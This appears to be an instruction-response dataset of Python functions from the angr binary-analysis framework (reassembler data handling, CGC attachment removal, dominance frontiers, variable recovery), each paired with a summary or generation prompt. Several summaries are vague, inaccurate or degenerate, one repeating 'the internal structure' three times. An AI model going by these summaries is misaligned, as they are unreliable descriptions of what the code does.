{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef shrink(self, new_size):\n        self.size = new_size\n\n        if self.sort == 'string':\n            self.null_terminated = False # string without the null byte terminator\n            self._content[0] = self._content[0][ : self.size]\n\n        elif self.sort == 'pointer-array':\n            pointer_size = self.binary.project.arch.bytes\n\n            if self.size % pointer_size != 0:\n                # it's not aligned?\n                raise BinaryError('Fails at Data.shrink()')\n\n            pointers = self.size // pointer_size\n            self._content = self._content[ : pointers]\n\n        else:\n            # unknown\n            self._content =  [ self._content[0][ : self.size ] ]", "response": "Reduces the size of the block of data."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the base address of the least - limbo region that contains the given address.", "response": "def main_executable_region_limbos_contain(self, addr):\n        \"\"\"\n        Sometimes there exists a pointer that points to a few bytes before the beginning of a section, or a few bytes\n        after the beginning of the section. We take care of that here.\n\n        :param int addr: The address to check.\n        :return: A 2-tuple of (bool, the closest base address)\n        :rtype: tuple\n        \"\"\"\n\n        TOLERANCE = 64\n\n        closest_region = None\n        least_limbo = None\n\n        for start, end in self.main_executable_regions:\n            if start - TOLERANCE <= addr < start:\n                if least_limbo is None or start - addr < least_limbo:\n                    closest_region = (True, start)\n                    least_limbo = start - addr\n            if end <= addr < end + TOLERANCE:\n                if least_limbo is None or addr - end < least_limbo:\n                    closest_region = (True, end)\n                    least_limbo = addr - end\n\n        if closest_region is not None:\n            return closest_region\n        return (False, None)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef main_nonexecutable_region_limbos_contain(self, addr, tolerance_before=64, tolerance_after=64):\n\n        closest_region = None\n        least_limbo = None\n\n        for start, end in self.main_nonexecutable_regions:\n            if start - tolerance_before <= addr < start:\n                if least_limbo is None or start - addr < least_limbo:\n                    closest_region = (True, start)\n                    least_limbo = start - addr\n            if end <= addr < end + tolerance_after:\n                if least_limbo is None or addr - end < least_limbo:\n                    closest_region = (True, end)\n                    least_limbo = addr - end\n\n        if closest_region is not None:\n            return closest_region\n        return False, None", "response": "Returns True if the address is within the least - limbo of the main nonexecutable region."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd a new label to the symbol manager.", "response": "def add_label(self, name, addr):\n        \"\"\"\n        Add a new label to the symbol manager.\n\n        :param str name: Name of the label.\n        :param int addr: Address of the label.\n        :return: None\n        \"\"\"\n\n        # set the label\n        self._symbolization_needed = True\n\n        self.symbol_manager.new_label(addr, name=name, force=True)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef insert_asm(self, addr, asm_code, before_label=False):\n\n        if before_label:\n            self._inserted_asm_before_label[addr].append(asm_code)\n        else:\n            self._inserted_asm_after_label[addr].append(asm_code)", "response": "Inserts some assembly code at the specific address."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a new procedure with specific name and assembly code.", "response": "def append_procedure(self, name, asm_code):\n        \"\"\"\n        Add a new procedure with specific name and assembly code.\n\n        :param str name: The name of the new procedure.\n        :param str asm_code: The assembly code of the procedure\n        :return: None\n        \"\"\"\n\n        proc = Procedure(self, name=name, asm_code=asm_code)\n        self.procedures.append(proc)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nappend a new data entry into the binary with specific name content and size.", "response": "def append_data(self, name, initial_content, size, readonly=False, sort=\"unknown\"):  # pylint:disable=unused-argument\n        \"\"\"\n        Append a new data entry into the binary with specific name, content, and size.\n\n        :param str name: Name of the data entry. Will be used as the label.\n        :param bytes initial_content: The initial content of the data entry.\n        :param int size: Size of the data entry.\n        :param bool readonly: If the data entry belongs to the readonly region.\n        :param str sort: Type of the data.\n        :return: None\n        \"\"\"\n\n        if readonly:\n            section_name = \".rodata\"\n        else:\n            section_name = '.data'\n\n        if initial_content is None:\n            initial_content = b\"\"\n        initial_content = initial_content.ljust(size, b\"\\x00\")\n        data = Data(self, memory_data=None, section_name=section_name, name=name, initial_content=initial_content,\n                    size=size, sort=sort\n                    )\n\n        if section_name == '.rodata':\n            self.extra_rodata.append(data)\n        else:\n            self.extra_data.append(data)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remove_cgc_attachments(self):\n\n        cgc_package_list = None\n        cgc_extended_application = None\n\n        for data in self.data:\n            if data.sort == 'cgc-package-list':\n                cgc_package_list = data\n            elif data.sort == 'cgc-extended-application':\n                cgc_extended_application = data\n\n        if not cgc_package_list or not cgc_extended_application:\n            return False\n\n        if cgc_package_list.skip or cgc_extended_application.skip:\n            # they have already been removed\n            # so we still return True to indicate that CGC attachments have been removed\n            return True\n\n        # there is a single function referencing them\n        cgcpl_memory_data = self.cfg.memory_data.get(cgc_package_list.addr, None)\n        cgcea_memory_data = self.cfg.memory_data.get(cgc_extended_application.addr, None)\n        refs = self.cfg.model.references\n\n        if cgcpl_memory_data is None or cgcea_memory_data is None:\n            return False\n\n        if len(refs.data_addr_to_ref[cgcpl_memory_data.addr]) != 1:\n            return False\n        if len(refs.data_addr_to_ref[cgcea_memory_data.addr]) != 1:\n            return False\n\n        # check if the irsb addresses are the same\n        if next(iter(refs.data_addr_to_ref[cgcpl_memory_data.addr])).block_addr != \\\n                next(iter(refs.data_addr_to_ref[cgcea_memory_data.addr])).block_addr:\n            return False\n\n        insn_addr = next(iter(refs.data_addr_to_ref[cgcpl_memory_data.addr])).insn_addr\n        # get the basic block\n        cfg_node = self.cfg.get_any_node(insn_addr, anyaddr=True)\n        if not cfg_node:\n            return False\n\n        func_addr = cfg_node.function_address\n\n        # this function should be calling another function\n        sub_func_addr = None\n        if func_addr not in self.cfg.functions:\n            return False\n        function = self.cfg.functions[func_addr]\n        # traverse the graph and make sure there is only one call edge\n        calling_targets = [ ]\n        for _, dst, data in function.transition_graph.edges(data=True):\n            if 'type' in data and data['type'] == 'call':\n                calling_targets.append(dst.addr)\n\n        if len(calling_targets) != 1:\n            return False\n\n        sub_func_addr = calling_targets[0]\n\n        # alright. We want to nop this function, as well as the subfunction\n        proc = next((p for p in self.procedures if p.addr == func_addr), None)\n        if proc is None:\n            return False\n\n        subproc = next((p for p in self.procedures if p.addr == sub_func_addr), None)\n        if subproc is None:\n            return False\n\n        # if those two data entries have any label, we should properly modify them\n        # at this point, we are fairly confident that none of those labels are direct data references to either package\n        # list or extended application\n        has_label = True\n        lowest_address = min(cgc_package_list.addr, cgc_extended_application.addr)\n        for obj in (cgc_package_list, cgc_extended_application):\n            labels = obj.labels\n            for addr, label in labels:\n                if addr != lowest_address:\n                    label.base_addr = lowest_address\n\n        if has_label:\n            # is there any memory data entry that ends right at the lowest address?\n            data = next((d for d in self.data if d.addr is not None and d.addr + d.size == lowest_address), None)\n            if data is None:\n                # since there is no gap between memory data entries (we guarantee that), this can only be that no other\n                # data resides in the same memory region that CGC attachments are in\n                pass\n            else:\n                lbl = self.symbol_manager.addr_to_label[lowest_address][0]\n                if lbl not in data.end_labels:\n                    data.end_labels.append(lbl)\n\n        # practically nop the function\n        proc.asm_code = \"\\tret\\n\"\n        subproc.asm_code = \"\\tret\\n\"\n\n        # remove those two data entries\n        cgc_package_list.skip = True\n        cgc_extended_application.skip = True\n\n        l.info('CGC attachments are removed.')\n\n        return True", "response": "Removes CGC attachments from the current state."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove unnecessary functions and data from the current object.", "response": "def remove_unnecessary_stuff(self):\n        \"\"\"\n        Remove unnecessary functions and data\n\n        :return: None\n        \"\"\"\n\n        glibc_functions_blacklist = {\n            '_start',\n            '_init',\n            '_fini',\n            '__gmon_start__',\n            '__do_global_dtors_aux',\n            'frame_dummy',\n            'atexit',\n            'deregister_tm_clones',\n            'register_tm_clones',\n            '__x86.get_pc_thunk.bx',\n            '__libc_csu_init',\n            '__libc_csu_fini',\n        }\n\n        glibc_data_blacklist = {\n            '__TMC_END__',\n            '_GLOBAL_OFFSET_TABLE_',\n            '__JCR_END__',\n            '__dso_handle',\n            '__init_array_start',\n            '__init_array_end',\n\n            #\n            'stdout',\n            'stderr',\n            'stdin',\n            'program_invocation_short_',\n            'program_invocation_short_name',\n            'program_invocation_name',\n            '__progname_full',\n            '_IO_stdin_used',\n            'obstack_alloc_failed_hand',\n            'optind',\n            'optarg',\n            '__progname',\n            '_environ',\n            'environ',\n            '__environ',\n        }\n\n        glibc_references_blacklist = {\n            'frame_dummy',\n            '__do_global_dtors_aux',\n        }\n\n        self.procedures = [p for p in self.procedures if p.name not in glibc_functions_blacklist and not p.is_plt]\n\n        self.data = [d for d in self.data if not any(lbl.name in glibc_data_blacklist for _, lbl in d.labels)]\n\n        for d in self.data:\n            if d.sort == 'pointer-array':\n                for i in range(len(d.content)):\n                    ptr = d.content[i]\n                    if isinstance(ptr, Label) and ptr.name in glibc_references_blacklist:\n                        d.content[i] = 0"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninitialize the binary. :return: None", "response": "def _initialize(self):\n        \"\"\"\n        Initialize the binary.\n\n        :return: None\n        \"\"\"\n\n        # figure out section alignments\n        for section in self.project.loader.main_object.sections:\n            in_segment = False\n            for segment in self.project.loader.main_object.segments:\n                segment_addr = segment.vaddr\n                if segment_addr <= section.vaddr < segment_addr + segment.memsize:\n                    in_segment = True\n                    break\n            if not in_segment:\n                continue\n\n            # calculate alignments\n            if section.vaddr % 0x20 == 0:\n                alignment = 0x20\n            elif section.vaddr % 0x10 == 0:\n                alignment = 0x10\n            elif section.vaddr % 0x8 == 0:\n                alignment = 0x8\n            elif section.vaddr % 0x4 == 0:\n                alignment = 0x4\n            else:\n                alignment = 2\n\n            self._section_alignments[section.name] = alignment\n\n        l.debug('Generating CFG...')\n        cfg = self.project.analyses.CFG(normalize=True, resolve_indirect_jumps=True, collect_data_references=True,\n                                        extra_memory_regions=[(0x4347c000, 0x4347c000 + 0x1000)],\n                                        data_type_guessing_handlers=[\n                                            self._sequence_handler,\n                                            self._cgc_extended_application_handler,\n                                            self._unknown_data_size_handler,\n                                        ],\n                                        )\n\n        self.cfg = cfg\n\n        old_capstone_syntax = self.project.arch.capstone_x86_syntax\n        if old_capstone_syntax is None:\n            old_capstone_syntax = 'intel'\n\n        if self.syntax == 'at&t':\n            # switch capstone to AT&T style\n            self.project.arch.capstone_x86_syntax = \"at&t\"\n            # clear the block cache in lifter!\n            self.project.factory.default_engine.clear_cache()\n\n        # initialize symbol manager\n        self.symbol_manager = SymbolManager(self, cfg)\n\n        # collect address of all instructions\n        l.debug('Collecting instruction addresses...')\n        for cfg_node in self.cfg.nodes():\n            self.all_insn_addrs |= set(cfg_node.instruction_addrs)\n\n        # Functions\n\n        l.debug('Creating functions...')\n        for f in cfg.kb.functions.values():\n            # Skip all SimProcedures\n            if self.project.is_hooked(f.addr):\n                continue\n            elif self.project.simos.is_syscall_addr(f.addr):\n                continue\n\n            # Check which section the start address belongs to\n            section = next(iter(sec.name for sec in self.project.loader.main_object.sections\n                                if f.addr >= sec.vaddr and f.addr < sec.vaddr + sec.memsize\n                                ),\n                           \".text\"\n                           )\n\n            if section in ('.got', '.plt', 'init', 'fini'):\n                continue\n\n            procedure = Procedure(self, f, section=section)\n            self.procedures.append(procedure)\n\n        self.procedures = sorted(self.procedures, key=lambda x: x.addr)\n\n        # Data\n\n        has_sections = len(self.project.loader.main_object.sections) > 0\n\n        l.debug('Creating data entries...')\n        for addr, memory_data in cfg._memory_data.items():\n\n            if memory_data.sort in ('code reference', ):\n                continue\n\n            if memory_data.sort == 'string':\n                # it might be the CGC package list\n                new_sort, new_size = self._cgc_package_list_identifier(memory_data.address, memory_data.size)\n                if new_sort is not None:\n                    # oh we got it!\n                    memory_data = memory_data.copy()\n                    memory_data.sort = new_sort\n\n            if has_sections:\n                # Check which section the start address belongs to\n                section = next(iter(sec for sec in self.project.loader.main_object.sections\n                                    if sec.vaddr <= addr < sec.vaddr + sec.memsize\n                                    ),\n                               None\n                               )\n\n                if section is not None and section.name not in ('.note.gnu.build-id', ):  # ignore certain section names\n                    data = Data(self, memory_data, section=section)\n                    self.data.append(data)\n                elif memory_data.sort == 'segment-boundary':\n                    # it just points to the end of the segment or a section\n                    section = next(iter(sec for sec in self.project.loader.main_object.sections\n                                        if addr == sec.vaddr + sec.memsize),\n                                   None\n                                   )\n                    if section is not None:\n                        data = Data(self, memory_data, section=section)\n                        self.data.append(data)\n\n                else:\n                    # data = Data(self, memory_data, section_name='.data')\n                    # the data is not really within any existing section. weird. ignored it.\n                    pass\n            else:\n                # the binary does not have any section\n                # we use segment information instead\n                # TODO: this logic needs reviewing\n                segment = next(iter(seg for seg in self.project.loader.main_object.segments\n                                    if seg.vaddr <= addr <= seg.vaddr + seg.memsize\n                                    ),\n                               None\n                               )\n\n                if segment is not None:\n                    data = Data(self, memory_data, section_name='.data')\n                    self.data.append(data)\n\n        # remove all data that belong to GCC-specific sections\n        section_names_to_ignore = {'.init', '.fini', '.fini_array', '.jcr', '.dynamic', '.got', '.got.plt',\n                                   '.eh_frame_hdr', '.eh_frame', '.rel.dyn', '.rel.plt', '.rela.dyn', '.rela.plt',\n                                   '.dynstr', '.dynsym', '.interp', '.note.ABI-tag', '.note.gnu.build-id', '.gnu.hash',\n                                   '.gnu.version', '.gnu.version_r'\n                                   }\n\n        # make sure there are always memory data entries pointing at the end of sections\n        all_data_addrs = set(d.addr for d in self.data)\n        all_procedure_addrs = set(f.addr for f in self.procedures)\n        all_addrs = all_data_addrs | all_procedure_addrs\n\n        if has_sections:\n            for section in self.project.loader.main_object.sections:\n\n                if section.name in section_names_to_ignore:\n                    # skip all sections that are CGC specific\n                    continue\n\n                # make sure this section is inside a segment\n                for segment in self.project.loader.main_object.segments:\n                    segment_start = segment.vaddr\n                    segment_end = segment_start + segment.memsize\n                    if segment_start <= section.vaddr < segment_end:\n                        break\n                else:\n                    # this section is not mapped into memory\n                    continue\n\n                section_boundary_addr = section.vaddr + section.memsize\n                if section_boundary_addr not in all_addrs:\n                    data = Data(self, addr=section_boundary_addr, size=0, sort='segment-boundary',\n                                section_name=section.name\n                                )\n                    self.data.append(data)\n                    # add the address to all_data_addrs so we don't end up adding another boundary in\n                    all_data_addrs.add(section_boundary_addr)\n\n        self.data = sorted(self.data, key=lambda x: x.addr)\n\n        data_indices_to_remove = set()\n\n        # Go through data entry list and refine them\n        for i, data in enumerate(self.data):\n\n            if i in data_indices_to_remove:\n                continue\n\n            # process the overlapping ones\n            if i < len(self.data) - 1:\n                if data.addr + data.size > self.data[i + 1].addr:\n                    # they are overlapping :-(\n\n                    # TODO: make sure new_size makes sense\n                    new_size = self.data[i + 1].addr - data.addr\n\n                    # there are cases that legit data is misclassified as pointers\n                    # we are able to detect some of them here\n                    if data.sort == 'pointer-array':\n                        pointer_size = self.project.arch.bytes\n                        if new_size % pointer_size != 0:\n                            # the self.data[i+1] cannot be pointed to by a pointer\n                            # remove that guy later\n                            data_indices_to_remove.add(i + 1)\n                            # mark the source as a non-pointer\n                            # apparently the original Reassembleable Disassembler paper cannot get this case\n                            source_addr = self.data[i + 1].memory_data.pointer_addr\n                            if source_addr is not None:\n                                # find the original data\n                                original_data = next((d for d in self.data if d.addr <= source_addr < d.addr + d.size),\n                                                     None\n                                                     )\n                                if original_data is not None:\n                                    original_data.desymbolize()\n\n                            continue\n\n                    data.shrink(new_size)\n\n            # process those ones whose type is unknown\n            if data.sort == 'unknown' and data.size == 0:\n                # increase its size until reaching the next item\n\n                if i + 1 == len(self.data):\n                    if data.section is None:\n                        continue\n                    data.size = data.section.vaddr + data.section.memsize - data.addr\n                else:\n                    data.size = self.data[i + 1].addr - data.addr\n\n        for i in sorted(data_indices_to_remove, reverse=True):\n            self.data = self.data[ : i] + self.data[i + 1 : ]\n\n        # CGC-specific data filtering\n        self.data = [ d for d in self.data if d.section_name not in section_names_to_ignore ]\n\n        # restore capstone X86 syntax at the end\n        if self.project.arch.capstone_x86_syntax != old_capstone_syntax:\n            self.project.arch.capstone_x86_syntax = old_capstone_syntax\n            self.project.factory.default_engine.clear_cache()\n\n        l.debug('Initialized.')"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _sequence_handler(self, cfg, irsb, irsb_addr, stmt_idx, data_addr, max_size):  # pylint:disable=unused-argument\n\n        if not self._is_sequence(cfg, data_addr, 5):\n            # fail-fast\n            return None, None\n\n        sequence_max_size = min(256, max_size)\n\n        for i in range(5, min(256, max_size)):\n            if not self._is_sequence(cfg, data_addr, i):\n                return 'sequence', i - 1\n\n        return 'sequence', sequence_max_size", "response": "This function handles the sequence processing."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the identifier of the CGC package list associated with the CGC binary.", "response": "def _cgc_package_list_identifier(self, data_addr, data_size):\n        \"\"\"\n        Identifies the CGC package list associated with the CGC binary.\n\n        :param int data_addr: Address of the data in memory.\n        :param int data_size: Maximum size possible.\n        :return: A 2-tuple of data type and size.\n        :rtype: tuple\n        \"\"\"\n\n        if data_size < 100:\n            return None, None\n\n        data = self.fast_memory_load(data_addr, data_size, str)\n\n        if data[:10] != 'The DECREE':\n            return None, None\n\n        if not all(i in string.printable for i in data):\n            return None, None\n\n        if not re.match(r\"The DECREE packages used in the creation of this challenge binary were:\", data):\n            return None, None\n\n        return 'cgc-package-list', data_size"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _cgc_extended_application_handler(self, cfg, irsb, irsb_addr, stmt_idx, data_addr, max_size):  # pylint:disable=unused-argument\n\n        if max_size < 100:\n            return None, None\n\n        data = self.fast_memory_load(data_addr, 20, bytes)\n\n        if data is not None and data[:4] != b'The ':\n            return None, None\n\n        # read everything in\n        data = self.fast_memory_load(data_addr, max_size, str)\n\n        m = re.match(r\"The ([\\d]+) byte CGC Extended Application follows.\", data)\n        if not m:\n            return None, None\n        pdf_size = int(m.group(1))\n\n        if '%PDF' not in data:\n            return None, None\n        if '%%EOF' not in data:\n            return None, None\n\n        pdf_data = data[data.index('%PDF') : data.index('%%EOF') + 6]\n\n        if len(pdf_data) != pdf_size:\n            return None, None\n\n        return 'cgc-extended-application', max_size", "response": "Handles the CGC extended application processing."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _unknown_data_size_handler(self, cfg, irsb, irsb_addr, stmt_idx, data_addr, max_size):  # pylint:disable=unused-argument\n\n        sequence_offset = None\n\n        for offset in range(1, max_size):\n            if self._is_sequence(cfg, data_addr + offset, 5):\n                # a potential sequence is found\n                sequence_offset = offset\n                break\n\n        if sequence_offset is not None:\n            if self.project.arch.bits == 32:\n                max_size = min(max_size, sequence_offset)\n            elif self.project.arch.bits == 64:\n                max_size = min(max_size, sequence_offset + 5)  # high 5 bytes might be all zeros...\n\n        ptr_size = cfg.project.arch.bytes\n\n        size = None\n\n        for offset in range(1, max_size - ptr_size + 1):\n            ptr = self.fast_memory_load(data_addr + offset, ptr_size, int, endness=cfg.project.arch.memory_endness)\n            if self._is_pointer(cfg, ptr):\n                size = offset\n                break\n\n        if size is not None:\n            return \"unknown\", size\n        elif sequence_offset is not None:\n            return \"unknown\", sequence_offset\n        else:\n            return None, None", "response": "Internal method to handle unknown data size."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntest if there is any integer being used as a pointer", "response": "def _has_integer_used_as_pointers(self):\n        \"\"\"\n        Test if there is any (suspicious) pointer decryption in the code.\n\n        :return: True if there is any pointer decryption, False otherwise.\n        :rtype: bool\n        \"\"\"\n\n        # check all integer accesses and see if there is any integer being used as a pointer later, but it wasn't\n        # classified as a pointer reference\n\n        # we only care about unknown memory data that are 4 bytes long, and is directly referenced from an IRSB\n        candidates = [ i for i in self.cfg.memory_data.values() if\n                       i.sort in ('unknown', 'integer') and\n                       i.size == self.project.arch.bytes and\n                       i.irsb_addr is not None\n                       ]\n\n        if not candidates:\n            return False\n\n        for candidate in candidates:\n\n            # if the candidate is in .bss, we don't care about it\n            sec = self.cfg.project.loader.find_section_containing(candidate.address)\n            if sec.name in ('.bss', '.got.plt'):\n                continue\n\n            # execute the single basic block and see how the value is used\n            base_graph = networkx.DiGraph()\n            candidate_node = self.cfg.get_any_node(candidate.irsb_addr)  # type: angr.analyses.cfg_node.CFGNode\n            if candidate_node is None:\n                continue\n            base_graph.add_node(candidate_node)\n            tmp_kb = KnowledgeBase(self.project)\n            cfg = self.project.analyses.CFGEmulated(kb=tmp_kb,\n                                                    starts=(candidate.irsb_addr,),\n                                                    keep_state=True,\n                                                    base_graph=base_graph\n                                                    )\n            candidate_irsb = cfg.get_any_irsb(candidate.irsb_addr)  # type: SimIRSB\n            ddg = self.project.analyses.DDG(kb=tmp_kb, cfg=cfg)\n\n            mem_var_node = None\n            for node in ddg.simplified_data_graph.nodes():\n                if isinstance(node.variable, SimMemoryVariable) and node.location.ins_addr == candidate.insn_addr:\n                    # found it!\n                    mem_var_node = node\n                    break\n            else:\n                # mem_var_node is not found\n                continue\n\n            # get a sub graph\n            subgraph = ddg.data_sub_graph(mem_var_node,\n                                          simplified=False,\n                                          killing_edges=False,\n                                          excluding_types={'mem_addr'},\n                                          )\n\n            # is it used as a memory address anywhere?\n            # TODO:\n\n            # is it used as a jump target?\n            next_tmp = None\n            if isinstance(candidate_irsb.irsb.next, pyvex.IRExpr.RdTmp):\n                next_tmp = candidate_irsb.irsb.next.tmp\n\n            if next_tmp is not None:\n                next_tmp_node = next((node for node in subgraph.nodes()\n                                      if isinstance(node.variable, SimTemporaryVariable) and\n                                         node.variable.tmp_id == next_tmp),\n                                     None\n                                     )\n                if next_tmp_node is not None:\n                    # ouch it's used as a jump target\n                    return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fast_memory_load(self, addr, size, data_type, endness='Iend_LE'):\n\n        if data_type is int:\n            try:\n                return self.project.loader.memory.unpack_word(addr, size=size, endness=endness)\n            except KeyError:\n                return None\n\n        try:\n            data = self.project.loader.memory.load(addr, size)\n            if data_type is str:\n                return \"\".join(chr(i) for i in data)\n            return data\n        except KeyError:\n            return None", "response": "Load memory bytes from loader's memory backend.\n\n        :param int addr:    The address to begin memory loading.\n        :param int size:    Size in bytes.\n        :param data_type:   Type of the data.\n        :param str endness: Endianness of this memory load.\n        :return:            Data read out of the memory.\n        :rtype:             int or bytes or str or None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nmerging two abstract states.", "response": "def merge(self, other, successor=None):\n        \"\"\"\n        Merge two abstract states.\n\n        For any node A whose dominance frontier that the current node (at the current program location) belongs to, we\n        create a phi variable V' for each variable V that is defined in A, and then replace all existence of V with V'\n        in the merged abstract state.\n\n        :param VariableRecoveryState other: The other abstract state to merge.\n        :return:                            The merged abstract state.\n        :rtype:                             VariableRecoveryState\n        \"\"\"\n\n        replacements = {}\n        if successor in self.dominance_frontiers:\n            replacements = self._make_phi_variables(successor, self, other)\n\n        merged_stack_region = self.stack_region.copy().replace(replacements).merge(other.stack_region,\n                                                                                   replacements=replacements)\n        merged_register_region = self.register_region.copy().replace(replacements).merge(other.register_region,\n                                                                                         replacements=replacements)\n\n        state = VariableRecoveryFastState(\n            successor,\n            self._analysis,\n            self.arch,\n            self.function,\n            stack_region=merged_stack_region,\n            register_region=merged_register_region,\n            processor_state=self.processor_state.copy().merge(other.processor_state),\n        )\n\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nprocesses a block and update the state.", "response": "def _process_block(self, state, block):  # pylint:disable=no-self-use\n        \"\"\"\n        Scan through all statements and perform the following tasks:\n        - Find stack pointers and the VEX temporary variable storing stack pointers\n        - Selectively calculate VEX statements\n        - Track memory loading and mark stack and global variables accordingly\n\n        :param angr.Block block:\n        :return:\n        \"\"\"\n\n        l.debug('Processing block %#x.', block.addr)\n\n        processor = self._ail_engine if isinstance(block, ailment.Block) else self._vex_engine\n        processor.process(state, block=block, fail_fast=self._fail_fast)\n\n        # readjusting sp at the end for blocks that end in a call\n        if block.addr in self._node_to_cc:\n            cc = self._node_to_cc[block.addr]\n            if cc is not None:\n                state.processor_state.sp_adjustment += cc.sp_delta\n                state.processor_state.sp_adjusted = True\n                l.debug('Adjusting stack pointer at end of block %#x with offset %+#x.',\n                        block.addr, state.processor_state.sp_adjustment)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nmaking a shallow copy of a graph and reverse the edges.", "response": "def shallow_reverse(g):\n    \"\"\"\n    Make a shallow copy of a directional graph and reverse the edges. This is a workaround to solve the issue that one\n    cannot easily make a shallow reversed copy of a graph in NetworkX 2, since networkx.reverse(copy=False) now returns\n    a GraphView, and GraphViews are always read-only.\n\n    :param networkx.DiGraph g:  The graph to reverse.\n    :return:                    A new networkx.DiGraph that has all nodes and all edges of the original graph, with\n                                edges reversed.\n    \"\"\"\n\n    new_g = networkx.DiGraph()\n\n    new_g.add_nodes_from(g.nodes())\n    for src, dst, data in g.edges(data=True):\n        new_g.add_edge(dst, src, **data)\n\n    return new_g"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndoing a DFS traversal of the graph and return with the back edges.", "response": "def dfs_back_edges(graph, start_node):\n    \"\"\"\n    Do a DFS traversal of the graph, and return with the back edges.\n\n    Note: This is just a naive recursive implementation, feel free to replace it.\n    I couldn't find anything in networkx to do this functionality. Although the\n    name suggest it, but `dfs_labeled_edges` is doing something different.\n\n    :param graph:       The graph to traverse.\n    :param node:        The node where to start the traversal\n    :returns:           An iterator of 'backward' edges\n    \"\"\"\n\n    visited = set()\n    finished = set()\n\n    def _dfs_back_edges_core(node):\n        visited.add(node)\n        for child in iter(graph[node]):\n            if child not in finished:\n                if child in  visited:\n                    yield node, child\n                else:\n                    for s,t in _dfs_back_edges_core(child):\n                        yield s,t\n        finished.add(node)\n\n    for s,t in _dfs_back_edges_core(start_node):\n        yield s,t"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing a dominance frontier based on the given post - dominator tree.", "response": "def compute_dominance_frontier(graph, domtree):\n    \"\"\"\n    Compute a dominance frontier based on the given post-dominator tree.\n\n    This implementation is based on figure 2 of paper An Efficient Method of Computing Static Single Assignment\n    Form by Ron Cytron, etc.\n\n    :param graph:   The graph where we want to compute the dominance frontier.\n    :param domtree: The dominator tree\n    :returns:       A dict of dominance frontier\n    \"\"\"\n\n    df = {}\n\n    # Perform a post-order search on the dominator tree\n    for x in networkx.dfs_postorder_nodes(domtree):\n\n        if x not in graph:\n            # Skip nodes that are not in the graph\n            continue\n\n        df[x] = set()\n\n        # local set\n        for y in graph.successors(x):\n            if x not in domtree.predecessors(y):\n                df[x].add(y)\n\n        # up set\n        if x is None:\n            continue\n\n        for z in domtree.successors(x):\n            if z is x:\n                continue\n            if z not in df:\n                continue\n            for y in df[z]:\n                if x not in list(domtree.predecessors(y)):\n                    df[x].add(y)\n\n    return df"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the successors of a node in the graph.", "response": "def _graph_successors(self, graph, node):\n        \"\"\"\n        Return the successors of a node in the graph.\n        This method can be overriden in case there are special requirements with the graph and the successors. For\n        example, when we are dealing with a control flow graph, we may not want to get the FakeRet successors.\n\n        :param graph: The graph.\n        :param node:  The node of which we want to get the successors.\n        :return:      An iterator of successors.\n        :rtype:       iter\n        \"\"\"\n\n        if self._graph_successors_func is not None:\n            return self._graph_successors_func(graph, node)\n\n        return graph.successors(node)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _construct(self, graph, entry_node):\n\n        # Step 1\n\n        _prepared_graph, vertices, parent = self._prepare_graph(graph, entry_node)\n        # vertices is a list of ContainerNode instances\n        # parent is a dict storing the mapping from ContainerNode to ContainerNode\n        # Each node in prepared_graph is a ContainerNode instance\n\n        bucket = defaultdict(set)\n        dom = [None] * (len(vertices))\n        self._ancestor = [None] * (len(vertices) + 1)\n\n        for i in range(len(vertices) - 1, 0, -1):\n            w = vertices[i]\n\n            # Step 2\n            if w not in parent:\n                # It's one of the start nodes\n                continue\n\n            predecessors = _prepared_graph.predecessors(w)\n            for v in predecessors:\n                u = self._pd_eval(v)\n                if self._semi[u.index].index < self._semi[w.index].index:\n                    self._semi[w.index] = self._semi[u.index]\n\n            bucket[vertices[self._semi[w.index].index].index].add(w)\n\n            self._pd_link(parent[w], w)\n\n            # Step 3\n            for v in bucket[parent[w].index]:\n                u = self._pd_eval(v)\n                if self._semi[u.index].index < self._semi[v.index].index:\n                    dom[v.index] = u\n                else:\n                    dom[v.index] = parent[w]\n\n            bucket[parent[w].index].clear()\n\n        for i in range(1, len(vertices)):\n            w = vertices[i]\n            if w not in parent:\n                continue\n            if dom[w.index].index != vertices[self._semi[w.index].index].index:\n                dom[w.index] = dom[dom[w.index].index]\n\n        self.dom = networkx.DiGraph()  # The post-dom tree described in a directional graph\n        for i in range(1, len(vertices)):\n            if dom[i] is not None and vertices[i] is not None:\n                self.dom.add_edge(dom[i].obj, vertices[i].obj)\n\n        # Output\n        self.prepared_graph = _prepared_graph", "response": "This method is used to construct the internal structure of the internal structure of the internal structure."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef load_all_loggers(self):\n        for name, logger in logging.Logger.manager.loggerDict.items():\n            if any(name.startswith(x + '.') or name == x for x in self.IN_SCOPE):\n                self._loggers[name] = logger", "response": "A simple way to aggregate all loggers."}
